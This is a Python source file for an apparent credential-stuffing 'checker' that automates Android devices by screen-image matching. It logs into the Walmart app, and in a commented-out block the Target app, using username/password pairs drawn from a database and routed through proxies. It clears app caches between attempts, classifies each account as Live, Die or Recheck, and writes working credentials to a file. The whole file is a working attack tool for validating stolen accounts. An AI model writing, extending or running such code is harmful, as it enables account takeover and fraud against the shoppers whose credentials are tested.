import os, threading, time,random
from Auto_Lib import Auto
from SqlManager import SQL
import main



class Checker_Yeah:
    
    def __init__(self, device, user, pass_user, proxy, id, i):
        self.device = device
        self.user = user
        self.pass_user = pass_user
        self.proxy = proxy
        self.id = id
        self.i = i
        self.obj_ui = main.MainWindow()

    
    '''
    def Target_Checker(self):
        obj = Auto(self.device)
        obj.change_proxy(self.proxy)
        while self.start:
            obj.DeleteCache("com.target.ui")
            time.sleep(5)
            point_logo = obj.find("target\\logo.png")
            if point_logo > [(0, 0)]:
                obj.click(point_logo[0][0], point_logo[0][1])
                time.sleep(10)
                point_sigin = obj.find("target\\sigin.png")
                if point_sigin > [(0, 0)]:
                    obj.click(point_sigin[0][0], point_sigin[0][1])
                    time.sleep(10)
                    point_email = obj.find("target\\email.png")
                    if point_email > [(0, 0)]:
                        obj.click(point_email[0][0], point_email[0][1])
                        obj.input_clip(user)
                        time.sleep(1)
                        point_pass = obj.find("target\\password.png")
                        if point_pass > [(0, 0)]:
                            obj.click(point_pass[0][0], point_pass[0][1])
                            obj.input_clip(pass_user)
                            time.sleep(1)
                            obj.swipe(510, 1212, 508, 526)
                            point_sigin = obj.find("target\\sigin.png")
                            if point_sigin > [(0, 0)]:
                                obj.click(point_sigin[0][0], point_sigin[0][1])

            time.sleep(10)

            point_live1 = obj.find("target\\live1.png")
            time.sleep(2)
            point_live2 = obj.find("target\\live2.png")
            time.sleep(2)
            point_live3 = obj.find("target\\live3.png")
            time.sleep(2)
            if point_live1 > [(0, 0)] or point_live2 > [(0, 0)] or point_live3 > [(0, 0)]:
                self.obj_ui.updatekk("Live", i)
            else:
                point_die1 = obj.find("target\\die1.png")
                time.sleep(2)
                point_die2 = obj.find("target\\die2.png")
                time.sleep(2)
                if point_die1 > [(0, 0)] or point_die2 > [(0, 0)]:
                    self.obj_ui.updatekk("Die", i)
                else:
                    self.obj_ui.updatekk("Recheck", i)

            time.sleep(2)
    '''

    def Walmart_Checker(self):
        obj = Auto(self.device)
        obj.change_proxy(self.proxy)
        obj_data = SQL(self.device)
        while self.obj_ui.start == True:
            print("True")
            obj.DeleteCache("com.walmart.android")
            time.sleep(2)
            exist = 0
            flag = 0
            self.obj_ui.updatekk("running....", self.i)
            time.sleep(1)
            obj.DeleteCache("com.walmart.android")
            time.sleep(3)
            point_walmart = obj.find("img\\walmart_icon.png")
            if point_walmart > [(0, 0)]:
                obj.click(point_walmart[0][0], point_walmart[0][1])
                time.sleep(5)
                point_sign = obj.find("img\\signin.png")
                if point_sign > [(0, 0)]:
                    obj.click(point_sign[0][0], point_sign[0][1])
                    time.sleep(3)
                    point_flag1 = obj.find("img\\Flag_Valid.png")
                    if point_flag1 > [(0, 0)]:
                        obj.swipe(515, 1166, 540, 701)
                        time.sleep(2)
                        point_email = obj.find("img\\email_box.png")
                        if point_email > [(0, 0)]:
                            obj.click(point_email[0][0], point_email[0][1])
                            time.sleep(2)
                            obj.input_clip(self.user)
                            time.sleep(2)
                            point_continue = obj.find("img\\continue.png")
                            if point_continue > [(0, 0)]:
                                obj.click(point_continue[0][0], point_continue[0][1])
                                time.sleep(8)
                                point_exist = obj.find("img\\Tontai.png")
                                if point_exist > [(0, 0)]:
                                    exist = 1
                                    self.obj_ui.updatekk(f"{self.device} is existed......", self.i)
                                    obj.swipe(510, 1212, 508, 526)
                                    obj.swipe(510, 1212, 508, 526)
                                    time.sleep(2)
                                    point_password = obj.find("img\\password_box.png")
                                    if point_password > [(0, 0)]:
                                        obj.click(point_password[0][0], point_password[0][1])
                                        time.sleep(1)
                                        obj.input_clip(self.pass_user)
                                        obj.swipe(510, 1212, 508, 526)
                                        obj.swipe(510, 1212, 508, 526)
                                        time.sleep(3)
                                        point_sign_2 = obj.find("img\\sigin2.png")
                                        if point_sign_2 > [(0, 0)]:
                                            obj.click(point_sign_2[0][0], point_sign_2[0][1])
                                        else:
                                            flag = 1
                                    else:
                                        flag = 1
                            else:
                                flag = 1
                        else:
                            flag = 1
                    else:
                        obj.swipe(515, 1166, 540, 701)
                        point_email = obj.find("img\\email_box.png")
                        if point_email > [(0, 0)]:
                            obj.click(point_email[0][0], point_email[0][1])
                            obj.input_clip(self.user)
                            time.sleep(1)
                            point_password = obj.find("img\\password_box.png")
                            if point_password > [(0, 0)]:
                                obj.click(point_password[0][0], point_password[0][1])
                                obj.input_clip(self.pass_user)
                                time.sleep(1)
                                point_sign = obj.find("img\\sigin2.png")
                                if point_sign > [(0, 0)]:
                                    obj.click(point_sign[0][0], point_sign[0][1])
                                    time.sleep(8)
                                    point_exist = obj.find("img\\Tontai.png")
                                    if point_exist > [(0, 0)]:
                                        exist = 1

                                        obj.swipe(510, 1212, 508, 526)
                                        obj.swipe(510, 1212, 508, 526)
                                        time.sleep(2)
                                        point_password = obj.find("img\\password_box.png")
                                        if point_password > [(0, 0)]:
                                            obj.click(point_password[0][0], point_password[0][1])
                                            time.sleep(1)
                                            obj.input_clip(self.pass_user)
                                            obj.swipe(510, 1212, 508, 526)
                                            obj.swipe(510, 1212, 508, 526)
                                            time.sleep(3)
                                            point_sign_2 = obj.find("img\\sigin2.png")
                                            if point_sign_2 > [(0, 0)]:
                                                obj.click(point_sign_2[0][0], point_sign_2[0][1])
                                            else:
                                                flag = 1
                                        else:
                                            flag = 1
                                else:
                                    flag = 1
                            else:
                                flag = 1
                        else:
                            flag = 1
                else:
                    flag = 1
            else:
                flag = 1

            time.sleep(10)
            if flag == 1:
                self.obj_ui.recheck += 1
                self.obj_ui.emit(self.obj_ui.recheck)
            else:
                point_check = obj.find("img\\live1.png")
                if point_check > [(0, 0)]:
                    self.obj_ui.updatekk(f"Live", self.i)
                    self.obj_ui.live += 1
                    self.obj_ui.signal_live.emit(self.obj_ui.live)
                    with open("livetrue.txt", 'a') as file:
                        file.write(f"{self.user}|{self.pass_user}|{self.proxy}\n")
                    #update_sql(seid, "live")
                    self.obj_ui.updatekk(f"SQL updated by {self.user}", self.i)
                    self.obj_ui.start = False
                else:
                    if exist == 0:
                        point_red = obj.find("img\\die.png")
                        if point_red > [(0, 0)]:
                            #self.die += 1
                            #self.signal_die.emit(self.die)
                            # update_sql_die(id)
                            self.obj_ui.updatekk(f"Die", self.i)
                        else:
                            point_error = obj.find("img\\error.png")
                            point_sign = obj.find("img\\sigin2.png")
                            point_check = obj.find("img\\recheck.png")
                            if point_error > [(0, 0)] or point_check > [(0, 0)] or point_sign > [0, 0]:
                                print("live")
                                #self.obj_ui.recheck += 1
                                #self.obj_ui.signal_recheck.emit(self.obj_ui.recheck)
                            else:
                                #self.obj_ui.die += 1
                                #self.obj_ui.signal_die.emit(self.obj_ui.die)
                                # update_sql_die(id)
                                self.obj_ui.updatekk(f"Die", self.i)
                    else:
                        point_sign = obj.find("img\\sigin2.png")
                        point_check = obj.find("img\\recheck.png")
                        if point_sign > [(0, 0)] or point_check > [(0, 0)]:
                            print("recheck")
                            self.obj_ui.recheck += 1
                            #self.obj_ui.signal_recheck.emit(self.obj_ui.recheck)
                        else:
                            self.obj_ui.die += 1
                            #self.obj_ui.signal_die.emit(self.obj_ui.die)
                            # update_sql_die(id)
                            #self.obj_ui.updatekk(f"Die", self.i)
            time.sleep(2)
            self.obj_ui.updatekk(f"{self.device} is Done", self.i)
            time.sleep(2)

            user = ""
            pass_user = ""
            proxy = self.proxy
            result_set =  obj_data.GetAccountData()
            for row in result_set:
                id = row[0]
                user = row[1]
                pass_user = row[2]
            self.obj_ui.updatekk2(self.device, user, pass_user, proxy, "Created", self.i)
        self.obj_ui.updatekk("Device Stopped", self.i)


